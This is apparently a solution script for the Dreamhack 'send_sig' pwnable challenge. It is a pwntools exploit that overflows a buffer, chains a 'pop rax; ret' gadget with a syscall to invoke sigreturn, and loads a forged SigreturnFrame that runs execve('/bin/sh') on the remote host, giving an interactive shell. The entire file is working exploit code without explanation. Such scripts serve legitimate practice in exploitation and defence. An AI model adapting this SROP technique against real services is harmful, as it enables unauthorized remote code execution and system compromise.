from pwn import *

port = 14036
rem = remote("host3.dreamhack.games", port)

context.arch = 'x86_64'
elf = ELF("./Pwnable/send_sig/problem/send_sig")

syscall = next(elf.search(asm("syscall")))
pop_rax = next(elf.search(asm("pop rax;ret")))
binsh = next(elf.search(b"/bin/sh"))

frame = SigreturnFrame()
frame.rip = syscall
frame.rax = 0x3b
frame.rdi = binsh

payload = b'A' * 8
payload += b'B' * 8
payload += p64(pop_rax)
payload += p64(15)
payload += p64(syscall)
payload += bytes(frame)

rem.sendlineafter(b"Signal:", payload)

rem.interactive()